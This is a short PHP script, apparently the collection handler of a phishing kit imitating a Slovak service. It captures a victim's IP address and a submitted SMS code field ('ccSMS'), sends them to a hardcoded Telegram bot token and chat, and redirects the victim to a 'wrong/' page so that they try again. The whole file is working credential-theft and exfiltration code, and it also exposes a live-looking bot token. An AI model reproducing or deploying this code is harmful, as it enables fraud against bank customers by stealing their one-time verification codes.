<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = " ---[ Post.sk_SMS ]--- \n";
$message .= " + IP   : $ip \n";
$message .= " + SMS : ".$_POST['ccSMS']." \n\n";
$message .= "-------------- IP Infos ------------\n";
$token = "5938124676:AAEYBihhIKnzs-WMUuNr1iUyb1qNyWb4vdw";
$data = [
    'text' => $message,
    'chat_id' => '-852929217'
];

file_get_contents("https://api.telegram.org/bot5938124676:AAEYBihhIKnzs-WMUuNr1iUyb1qNyWb4vdw/sendMessage?" . http_build_query($data) );



header("Location: wrong/");?>